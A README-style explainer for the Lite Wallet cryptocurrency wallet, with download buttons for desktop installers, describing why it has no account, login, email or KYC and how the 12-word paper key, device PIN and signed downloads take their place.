![Lite Wallet](assets/banner-article.png)

# No account, no login, no email: what that means

No account, no reset link, and nothing to recover but the paper key.

<p align="center"><a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-win-v3.15.2.exe"><img src="assets/button-windows.png" alt="Download Lite Wallet for Windows"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-00D5FD?style=for-the-badge&labelColor=001116&logo=apple&logoColor=89EFFF" alt="Download Lite Wallet for macOS"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-00D5FD?style=for-the-badge&labelColor=001116&logo=linux&logoColor=89EFFF" alt="Download Lite Wallet for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`litewallet-desktop-win-v3.15.2.exe`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-win-v3.15.2.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-00D5FD?style=flat-square&labelColor=001116&logo=apple&logoColor=89EFFF" alt="macOS"> | macOS 12 or later | [`litewallet-desktop-macos-v3.15.2.dmg`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-00D5FD?style=flat-square&labelColor=001116&logo=linux&logoColor=89EFFF" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`litewallet-desktop-linux-v3.15.2.zip`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip) |

</div>

All versions, installers and checksums are on the [release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2).

> Only download from this GitHub release page.

Lite Wallet has no account, no login, no email address and no password. There is nothing to sign up for and nothing to reset, because the wallet is not an account on a server - it is software on your device holding your keys. The 12-word paper key replaces everything a login would do, and losing it is the only way to lose access.

## Why there is no login

A login exists to prove to a server who you are, so the server can release your data. Lite Wallet has no server holding your data, so there is nothing to prove and nobody to prove it to. Your keys are on your device; opening the app is the whole authentication.

That design removes an entire category of failure at once. There is no password to forget, no email to phish, no reset link to intercept, no account takeover and no support agent who can be social-engineered into unlocking a wallet. It also removes the recovery net: with no account, there is no one who can restore access on your behalf.

## What people expect, and what they get

Most "I can't log in" reports are not a login problem at all. A new user installs the app, sees a screen asking for 12 words, and reads it as a sign-in form. It is the restore flow, offered because the app cannot know whether this is a new wallet or an existing one.

| What you see | What it actually is | What to do |
|---|---|---|
| a screen asking for 12 words | restore flow for an existing wallet | enter the words, or choose to create a new wallet |
| a PIN prompt | device-level lock on the local wallet | enter the PIN you set on this device |
| "create wallet" | first-run setup | write the new 12 words down |
| an email field anywhere | not this wallet | check the source before typing anything |

If an app claiming to be Lite Wallet asks for an email, a password or a phone number, it is not following this model, and that is a reason to check the download rather than to fill the form. [The download verification guide](https://github.com/litewallet-dev/litecoin-wallet-setup/blob/main/verify-signed-litewallet-download.md) covers the check.

## What replaces an account

Three things do the work a login would otherwise do, and each has a consequence worth understanding.

The **paper key** is the credential. Whoever holds the 12 words controls the wallet, on any device, without contacting anyone. That is why the phrase must never be typed into a website and never shared with a "support" channel.

The **device** is the second boundary. The wallet stores encrypted key material locally and unlocks with the PIN or device lock you set. A stolen unlocked phone is a stolen wallet; a locked one with a paper backup is an inconvenience.

The **signature** on the download is the third. With no account to verify, the only trust anchor is that the software you run is the software the project signed. [The safety guide](https://github.com/litewallet-dev/litecoin-wallet-setup/blob/main/is-litewallet-safe-to-use.md) sets out the model in full.

One consequence is worth flagging early: with no account, there is no way to prove ownership of a wallet to a third party. If a service asks you to sign a message to prove you control an address, that is a signature, not a login, and it is the only kind of proof this model can produce.

## No KYC, and what that does and does not mean

There is no identity check to use the wallet. You can install it, receive Litecoin and send it without giving anyone a name, an address or a document. That is a property of self-custody software, not a loophole.

It does not make activity invisible. The chain is public; a purchase from an exchange that verified you creates a record that links to your address. MWEB changes what is published about a transaction, and *the traceability guide* covers what remains visible. The wallet's contribution is that it does not collect identity itself.

## Moving to a new device without an account

Migration is a restore, not a transfer. Install the app on the new device, choose restore, enter the 12 words, and let the scan finish. There is no pairing code, no cloud sync and no confirmation email, because none of those exist without an account.

That is also why a device handover needs care. Two devices with the same phrase are two wallets that can both spend. After confirming the new device works, wipe the old one - and remember that "wipe" means removing the wallet data, not just uninstalling an icon.

## What support can and cannot do

Support can explain behaviour, point to the right guide and confirm whether a download is genuine. Support cannot reset a password, restore a wallet, reverse a transaction or look up a balance, because none of those things exist on a server.

That is worth saying plainly in both directions. A real support channel will never ask for your 12 words, and any message that does is an impersonator, whatever name it uses. *The support and real-app guide* covers how to tell the difference.

If you are starting from nothing, the sequence is: pick a wallet, open it, write the backup, test with a small amount. [The wallet chooser](https://github.com/litewallet-dev/litecoin-wallet-setup/blob/main/litewallet-guide-to-litecoin-wallets.md) walks that path generically, and this page covers why none of those steps involves a login.

## FAQ

### Why can't I log in?

Because there is no login. If the app is asking for 12 words, it is offering to restore a wallet; if it is asking for a PIN, that is the device lock you set. There is no email-and-password step anywhere in Lite Wallet.

### Can I reset my password?

There is no password to reset. The nearest equivalent is the paper key: if you have it, you can restore the wallet anywhere; if you do not, the wallet cannot be recovered.

### Does Lite Wallet collect my email or phone number?

No. There is no field for either, no account record and no marketing list tied to a wallet. Nothing in the setup asks for contact details.

### What happens if I install on a new phone?

Choose restore, enter the 12 words, and let the wallet scan. The same phrase produces the same wallet on any platform; there is no account to migrate and no email confirmation to click.

### Is a wallet without an account safer?

It removes account takeover, password reuse and phishing of a login, and it removes the recovery net at the same time. The security then rests on your backup and your device, which is a smaller surface but a personal one.

There is nothing to sign up for; the current release is on [the release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2).
